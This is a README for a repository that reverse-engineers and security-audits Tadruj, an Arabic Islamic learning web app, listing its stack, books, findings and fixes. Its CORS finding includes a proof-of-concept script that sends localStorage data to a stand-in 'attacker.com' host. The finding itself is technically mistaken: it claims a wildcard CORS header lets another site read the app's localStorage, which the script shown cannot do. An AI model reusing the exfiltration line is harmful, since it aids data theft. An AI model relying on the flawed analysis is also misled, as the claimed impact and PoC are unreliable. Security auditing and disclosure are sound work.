# 🕌 تدرّج - Reverse Engineering & Security Audit

> **⚠️ Disclaimer:** This repository contains reverse engineered source code for educational and security research purposes only. The original application belongs to its respective owners.

## 📋 Overview

**Target:** https://tadruj.vercel.app/  
**Application:** تدرّج - رحلة العلم والعمل (Islamic Learning Platform)  
**Type:** React-based Single Page Application (SPA)  
**Assessment Date:** 2026-07-14

---

## 🎯 What's Inside

### 📁 Repository Structure

```
tadruj-reversed/
├── 📂 source/              # Extracted source code
│   ├── bundle.min.js       # Minified JavaScript bundle (577KB)
│   ├── index.html          # Main HTML entry point
│   └── extracted/          # Beautified & analyzed code
│
├── 📂 reports/             # Security & analysis reports
│   ├── security-audit.md   # Full penetration test report
│   └── source-analysis.md  # Source code analysis
│
├── 📂 docs/                # Documentation
│   ├── APPLICATION_FLOW.md # Application logic flow
│   ├── DATA_STRUCTURES.md  # Data models & storage
│   └── SECURITY_FINDINGS.md # Vulnerability details
│
├── 📂 assets/              # Screenshots & media
│
└── 📂 tools/               # Analysis scripts
    ├── deobfuscate.py      # JavaScript beautifier
    ├── analyze.py          # Code analysis tools
    └── exploit-poc/        # Proof of concept exploits
```

---

## 🏗️ Application Architecture

### Technology Stack

| Component | Technology |
|------------|------------|
| Frontend Framework | React 19.2.4 |
| Build Tool | Vite (Production) |
| State Management | React Hooks (useState/useEffect) |
| Styling | CSS (likely CSS Modules) |
| Hosting | Vercel Edge Network |
| Language Support | Arabic (RTL) |

### Key Features

- ✅ Islamic Educational Content
- ✅ Progress Tracking (localStorage)
- ✅ Multiple Learning Levels
- ✅ Quiz System
- ✅ YouTube Video Integration
- ✅ Offline Capable

### Books Collection

| Book Name | Category |
|-----------|----------|
| الأصول الثلاثة | العقيدة |
| عمدة الفقه | الفقه |
| الأربعون النووية | الحديث |
| أسماء الله الحسنى | التزكية |
| حلية طالب العلم | الآداب |
| كتاب التوحيد | العقيدة |
| رياض الصالحين | الحديث |
| الفقه الميسر | الفقه |
| الناجون من عصر التفاهة | آداب |

### Learning Levels

1. **التمهيدي** (Preliminary)
2. **التأهيلي** (Qualifying)
3. **المتقدم** (Advanced)

---

## 🔐 Security Assessment

### Overall Score: **C+ (65/100)** ⚠️

### Critical Findings

#### 🔴 HIGH: CORS Wildcard Misconfiguration

**Severity:** HIGH (7.5/10)  
**CVSS:** 7.5  
**CWE:** CWE-942

##### Description
The application uses `Access-Control-Allow-Origin: *`, allowing any external website to read user data.

##### Impact
- Data exfiltration from localStorage
- Cross-site data theft
- User tracking across domains

##### Proof of Concept
```html
<!-- Attacker's website -->
<script>
fetch('https://tadruj.vercel.app/')
  .then(r => r.text())
  .then(data => {
    // Steal user progress
    const progress = localStorage.getItem('tadarruj_progress_v2');
    new Image().src = 'https://attacker.com/steal?data=' + 
      encodeURIComponent(progress + data);
  });
</script>
```

##### Remediation
```json
// vercel.json
{
  "headers": [{
    "source": "/(.*)",
    "headers": [{
      "key": "Access-Control-Allow-Origin",
      "value": "https://tadruj.vercel.app"
    }]
  }]
}
```

---

#### 🟡 MEDIUM: Missing Content Security Policy

**Severity:** MEDIUM (5.0/10)

##### Remediation
```http
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
```

---

#### 🟢 LOW: Missing Security Headers

Missing:
- `X-Frame-Options: DENY`
- `X-Content-Type-Options: nosniff`
- `Referrer-Policy: strict-origin-when-cross-origin`

---

## 💾 Data Structures

### LocalStorage Schema

```javascript
// User Progress
{
  "tadarruj_progress_v2": {
    "book": "الأصول الثلاثة",
    "level": "التمهيدي",
    "completed_questions": [1, 2, 3],
    "score": 85,
    "last_updated": "2026-07-14T09:00:00Z"
  }
}

// User Profile
{
  "tadarruj_profile_v2": {
    "name": "User Name",
    "preferences": {
      "theme": "light",
      "language": "ar"
    }
  }
}

// Help Acknowledgment
{
  "tadarruj_help_ack": "true"
}
```

---

## 🛠️ Tools & Scripts

### Deobfuscate JavaScript

```bash
cd tools
python3 deobfuscate.py ../source/bundle.min.js
```

### Analyze Application

```bash
python3 analyze.py --target https://tadruj.vercel.app/
```

---

## 📊 Statistics

| Metric | Value |
|--------|-------|
| JS Bundle Size | 581,993 bytes |
| Arabic UI Strings | 244 |
| React Components | 30+ |
| Function Definitions | 1,551 |
| Hooks (useState) | 30 |
| Hooks (useEffect) | 37 |
| localStorage Keys | 3 |

---

## 🎯 Recommendations

### Immediate (24 hours)

- [ ] Fix CORS configuration
- [ ] Add Content-Security-Policy header
- [ ] Add X-Frame-Options header

### Short-term (1 week)

- [ ] Encrypt localStorage data
- [ ] Implement CSRF protection
- [ ] Add rate limiting

### Long-term (1 month)

- [ ] Migrate to HttpOnly cookies
- [ ] Implement proper authentication
- [ ] Add security monitoring

---

## 📚 References

- [CWE-942: Permissive Cross-domain Policy](https://cwe.mitre.org/data/definitions/942.html)
- [OWASP CORS Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/COR_S_Cheatsheet.html)
- [MDN: CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)

---

## ⚖️ Legal Notice

This reverse engineering was conducted for **security research and educational purposes only**. 

- ✅ No production systems were harmed
- ✅ No user data was accessed
- ✅ No malicious activities performed
- ✅ Findings reported responsibly

**Original Application:** https://tadruj.vercel.app/  
**Repository Purpose:** Security Education & Research

---

## 👥 Credits

**Security Assessment:** Hermes Security Assessment Team  
**Date:** 2026-07-14  
**Tools Used:** curl_cffi, Python, React DevTools

---

## 📞 Contact

For questions or responsible disclosure:  
GitHub Issues: https://github.com/MahmoudAtteyya/tadruj-reversed/issues

---

**Last Updated:** 2026-07-14  
**Repository Version:** 1.0.0
